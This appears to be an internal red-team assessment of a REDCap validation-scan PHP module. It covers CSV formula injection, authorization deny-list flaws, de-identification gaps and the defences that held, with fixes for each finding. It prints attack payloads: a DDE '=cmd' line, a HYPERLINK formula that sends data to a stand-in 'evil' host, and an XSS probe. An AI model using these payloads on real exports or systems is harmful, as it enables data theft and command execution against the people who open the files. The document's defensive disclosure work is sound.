# Validation scan — security red team

Adversarial security assessment of the validation scan as shipped. Written without reference to
the earlier review rounds: every claim below was re-derived from the source and then executed.

**Target:** `main` at `ae75956` (1.8.7) — `UniversalValidator.php` scan path, `pages/scan.php`,
`pages/export.php`, `php/ScanPageView.php`, `php/ScanColumns.php`, `php/ScanDimensions.php`,
`php/ScanCapabilities.php`, `php/MessageCatalog.php`, `php/FindingSink.php` (6,138 lines).

**Baseline:** full PHP suite green — 1,396 checks, 0 failures.

**Harnesses:** `tools/temporal_scan_redteam5.php` (13 shots),
`tools/temporal_scan_redteam5b.php` (4 shots). `tools/` is `export-ignore`d.

```bash
php tools/temporal_scan_redteam5.php  .
php tools/temporal_scan_redteam5b.php .
```

**17 shots fired, 8 landed.** Three are exploitable by someone with no more privilege than the
ability to write a field value.

| ID | Finding | Severity |
|---|---|---|
| SEC-01 | CSV formula injection via the scrub/skip-list gap | **Critical** |
| SEC-02 | `mayReadForm()` grants read on any value that is not exactly `"0"` | **High** |
| SEC-03 | De-identified export rights receive free-text and unshifted dates | **High** |
| SEC-04 | `mayExportFor()` grants download on any value that is not exactly `"0"` | Medium |
| SEC-05 | `group_id` of `"0"`, `0` or `false` escapes DAG confinement | Medium (latent) |
| SEC-06 | Form-rights shape assumption bars every rule with no diagnostic | Medium (availability) |
| SEC-07 | Barred instruments' fields are still read from the database | Low |

## SEC-01 — CSV formula injection (Critical)

**Where:** `php/ScanPageView.php:54` (`scrub`) and `:67` (`csv`).

Two byte lists disagree, and the gap between them is the exploit.

`scrub()` deletes:

```
\x00  \x01-\x08  \x0B  \x0C  \x0E-\x1F  \x1A  \x7F
```

`csv()`'s formula scan skips only:

```
SP  \x09  \x0A  \x0B  \x0C  \x0D  \x00
```

A byte in the first list but not the second — **`\x01`–`\x08`, `\x0E`–`\x1F`, `\x7F`** — stops the
formula scan (so the cell is judged "not a formula" and is never prefixed with an apostrophe) and
is then deleted by `scrub()`, re-exposing the `=` as the cell's first character.

```
csv("=cmd|'/c calc'!A1")      = "'=cmd|'/c calc'!A1"    <- correct
csv("\x01=cmd|'/c calc'!A1")  = "=cmd|'/c calc'!A1"     <- live formula
```

27 distinct prefix bytes produce a live formula: `\x01 \x02 \x03 \x04 \x05 \x06 \x07 \x08 \x0E
\x0F \x10 \x11 \x12 \x13 \x14 \x15 \x16 \x17 \x18 \x19 \x1A \x1B \x1C \x1D \x1E \x1F \x7F`.

**End to end through the real exporter,** not just the unit:

```
stored value : \x01=HYPERLINK("http://evil/"&A1,"click")
report value : =HYPERLINK("http://evil/"&A1,"click")      (reportValue passes it through)
exported cell: "=HYPERLINK(""http://evil/""&A1,""click"")"
```

The comment at `:88` states the ordering is deliberate — *"The ORDER matters: the formula scan
above runs on the bytes as stored… Scrubbing first could delete a control byte and expose a '='
that the pre-scrub scan had already accounted for."* The pre-scrub scan **does not** account for
scrubbed bytes; it accounts for *skipped* bytes, and the two sets are different. The reasoning is
right and the implementation encodes the wrong set.

**Who can exploit it.** Anyone who can write a field value. Control bytes travel fine through the
REDCap API and the Data Import Tool, and through a crafted survey POST — which are precisely the
write channels this scan exists to audit, so hostile bytes from them are the expected input, not
an edge case. The victim is whoever opens the exported CSV, typically a data manager on a
workstation with Excel.

**Impact.** `=HYPERLINK` exfiltrates neighbouring cell contents on click; `=cmd|'/c …'!A1` is DDE
command execution on unpatched or policy-relaxed Excel; `=WEBSERVICE(…)` pulls remote content in
older builds. The file is generated by a trusted internal tool and named
`validation_scan_pid…csv`, so it carries more trust than an emailed attachment.

**Fix.** One list, used twice — decide the skip set from the scrub set:

```php
// Any byte scrub() will delete must also be skipped when looking for the
// formula character, or deleting it re-exposes what the scan just cleared.
$s = self::scrub($s);                       // scrub FIRST
$i = strspn($s, " \t\r\n");                 // then skip what a spreadsheet skips
if (substr($s, $i, 3) === "\xEF\xBB\xBF") $i += 3;
if (isset($s[$i]) && strpos('=+-@', $s[$i]) !== false) $s = "'" . $s;
```

Scrubbing first is safe once it happens first: there is no byte left for the scan to mis-skip. Add
a test that asserts, for every byte `\x00`–`\x1F` and `\x7F`, that `csv(chr($b) . "=x")` contains a
defusing apostrophe.

## SEC-02 — `mayReadForm()` implements a deny-list where the docblock specifies an allow-list (High)

**Where:** `UniversalValidator.php:1276`.

```php
private static function mayReadForm($rights, $form)
{
    if (!is_array($rights)) return false;
    if (!array_key_exists($form, $rights)) return false;
    return (string) $rights[$form] !== '0';
}
```

The docblock directly above states the intended rule: *"REDCap's levels: 0 no access; 1 view/edit,
2 read-only and 3 edit survey responses all imply the form can be read."* That is an allow-list of
`1|2|3`. The code asks the inverse question.

Measured across the value space:

```
GRANTS read : '1' | '2' | '3' | '' | NULL | false | true | 'x' | '00' | ' 0' | '0.0'
DENIES read : int 0   (and, correctly, '0')
```

Everything that is not the exact string `"0"` opens the instrument — including the empty string,
which is what a malformed rights entry such as `"fb:"` parses to, and `NULL`, which is what a
missing column value yields.

**Confirmed end to end.** A user with design rights, `data_export_tool = 1`, and
`forms => ['fa' => '1', 'fb' => null]` reads the raw contents of instrument `fb`:

```
value from the No-Access form = 'MRN-99881'
```

**Fix:**

```php
return in_array((string) $rights[$form], ['1', '2', '3'], true);
```

## SEC-03 — de-identified export rights receive free-text and unshifted dates (High)

**Where:** `php/ScanPageView.php:199`.

```php
if ($dx === '1') return 'raw';
if ($dx === '2' || $dx === '3') return 'identifier-redacted';
```

REDCap's two levels are not the same rule:

- **3 — Remove all identifier fields:** strips fields carrying the Identifier flag.
- **2 — De-Identified:** strips Identifier fields **and** all free-form text, notes fields, and
  date/datetime fields (dates are removed or shifted).

Both are mapped to `identifier-redacted`, which redacts only Identifier-flagged fields. A user
REDCap restricts to de-identified exports therefore reads, in the scan report, exactly the
categories that level exists to remove:

```
data_export_tool = 2 -> ceiling identifier-redacted
values reaching the user:
  clinical_note : "Pt disclosed HIV status to sister on 2019-04-02"
  dob           : "1974-11-03"
```

Neither field carries the Identifier flag; both are stripped by REDCap's own de-identified export.
The module presents them raw, from one URL, for every record in the project.

**Fix.** Map `2` to a stricter mode than `3`. The mode needs to consult
`field_type` (`notes`, `text` with a date/datetime validation) as well as the Identifier flag —
`projectFieldTypes()` already exists and `reportValue()` already receives the plan. Until that
exists, mapping `2` to `locations` is the honest interim: it under-discloses rather than over-.

## SEC-04 — `mayExportFor()` shares the deny-list defect (Medium)

**Where:** `php/ScanPageView.php:225`. Same shape as SEC-02:

```php
return (string) $rights['data_export_tool'] !== '0';
```

```
GRANTS export : '1' | '2' | '3' | '' | NULL | false | 'x' | '00' | ' 0'
DENIES export : '0' | int 0
```

The docblock says *"Unreadable or absent rights are no rights, because the safe direction is the
restrictive one."* Absent is handled (`array_key_exists` → false). **Present-but-unreadable is
not:** `NULL`, `''` and `false` all download.

Severity is held to Medium because `valueCeilingFor()` independently maps every unrecognised value
to `locations`, so the file that leaves is location-only. It still contains every record id, every
instrument, every field and every finding for the whole project, handed to a user REDCap bars from
its exporter.

**Fix:** `return in_array((string) $rights['data_export_tool'], ['1','2','3'], true);`

## SEC-05 — `group_id` of `"0"`, `0` or `false` escapes DAG confinement (Medium, latent)

**Where:** `php/ScanPageView.php:147`.

```php
if (empty($rights['group_id'])) {
    return ['ok' => true, 'dag' => null, ...];   // unconfined: whole project
}
```

`empty()` conflates every falsy value with "no group":

```
'0'   -> dag=NULL      0     -> dag=NULL     false -> dag=NULL
''    -> dag=NULL      NULL  -> dag=NULL
'00'  -> dag='north'   '1'   -> dag='north'
```

A DAG-confined user whose `group_id` is `0` or `"0"` scans and exports the **whole project**.
REDCap auto-increments `redcap_data_access_groups.group_id` from 1, so this is not reachable on a
stock install — which is why it is Medium and not High. It is still a scope-escape primitive
sitting in an authorization path, one restore, migration or fixture away from being real, and the
adjacent `group_id` unwrap at `:141` is already written defensively.

**Fix:** `if (!isset($rights['group_id']) || $rights['group_id'] === '' || $rights['group_id'] === null)`.

## SEC-06 — the form-rights gate depends on an undocumented shape, and fails silently-total (Medium, availability)

**Where:** `UniversalValidator.php:1175` (`userFormRights`).

Both resolution paths require `$rights['forms']` to be an **array**:

```php
if (is_array($r) && isset($r['forms']) && is_array($r['forms'])) return $r['forms'];
```

REDCap stores per-instrument rights as a packed string — `"fa:1,fb:0"` — and whether
`getRights()` hands back the packed string or a parsed array varies by build. When it is a string,
both paths miss, `userFormRights()` returns `null`, and `mayReadForm()` correctly denies
everything. Observed:

```
value from the barred form = NULL          (fails closed - good)
rule problem raised        = true
why = "your per-instrument rights could not be established, so no instrument could be cleared…"
```

The direction is right. The consequence is that on such a build **every rule in every project is
reported as unevaluable** and the scan produces nothing but rule problems, with a message that
reads like a per-user misconfiguration rather than an unsupported framework shape. Nothing tells an
administrator which shape was seen.

**Fix:** accept the packed string too — parse `"form:level"` pairs — and, when neither shape
resolves, say so as a distinct diagnostic rather than as a rights failure.

## SEC-07 — fields on barred instruments are still read from the database (Low)

`scanPlan()` prunes `$hostFields[$i]` for a partially barred rule, then builds the read set from
the rule's **full** field list:

```php
foreach ($live as $r) {
    foreach ($r['fields'] as $f) $readSet[$f] = true;   // includes barred hosts' fields
```

The barred host is not evaluated and produces no finding — confirmed, `fields appearing in
findings = ["a1"]` with `b1` barred — so this is not a disclosure. It is a data-minimisation
defect: values the reader is not entitled to are pulled into PHP memory on every chunk, widening
the blast radius of any later bug in this path. Build the read set from `$hostFields` after the
gate has run.

## Defences that held

Fired at and survived. Recorded so the next assessment does not re-spend the effort.

- **Stored XSS.** `"><svg onload=alert(1)>` planted simultaneously in a record id and a field
  value renders escaped on the report page; no raw tag anywhere. Every generated cell goes through
  `ScanPageView::h()`, which shares `scrub()`.
- **Export gating.** `data_export_tool = 0` is refused: `Content-Type: text/plain`, no
  `Content-Disposition`, 153 bytes, no record id in the body.
- **Strict record-id mode.** With `log-values = none`, no raw record id appears anywhere in the
  exported file — findings, comments, or the not-scanned rows.
- **Identifier redaction.** A field flagged `identifier = Y` returns `[identifier withheld]` under
  a de-identified ceiling. The flag parser lowercases and trims, and accepts `y|yes|1|true`, so
  case and padding do not evade it.
- **SQL injection.** Every query in `ScanCapabilities` is parameterised. The one unavoidable
  identifier interpolation — the sharded log table — is whitelisted by
  `preg_match('/^redcap_log_event[0-9]*\z/')`, anchored with `\z` rather than `$`, so a trailing
  newline cannot pass.
- **ReDoS.** A nested-quantifier pattern `^(a+)+$` is refused by the config-time risky-pattern gate
  and never reaches the scan engine; the scan reports it as a rule problem (0 ms over 5 records).
- **DAG manifest filter.** The shape check is hoisted out of the exclusion test, so a record node
  that is not an array is excluded and counted, never admitted.
- **Unique dedup key.** A record id containing the `|` separator (`"1|1|1|mrn"`) does not collide
  with another record's key; both duplicate findings are emitted.
- **Unique composite over a barred instrument.** A `@UVUNIQUE` keyed `with` a field on a
  No-Access form bars the whole rule rather than computing a verdict from unreadable data —
  `ruleRefFields()` correctly includes `uniqueWith`.

## A note on method

Five of these shots initially reported "held" for the wrong reason: the fake user object had no
`getUsername()`, so `userFormRights()` returned `null` at its first line, every rule was barred,
and the probes recorded a defence that had never been reached. SEC-02 and the end-to-end half of
SEC-01 only appeared after that was corrected.

A control that refuses because it never ran looks exactly like a control that works. Any assertion
in this report that is not accompanied by printed evidence of the payload arriving should be
treated as untested.

## Remediation order

1. **SEC-01** — one list used twice, plus a byte-range test. Smallest fix, largest exposure, and
   the only finding reachable by someone with no account.
2. **SEC-02** and **SEC-04** — two `in_array` allow-lists. Both are one line.
3. **SEC-03** — needs a decision on what `identifier-redacted` means for export level 2; mapping
   `2` to `locations` closes the disclosure today at the cost of showing fewer values.
4. **SEC-05**, **SEC-06**, **SEC-07** — hardening; none is currently reachable on a stock install,
   and SEC-06 is a usability cliff rather than a hole.
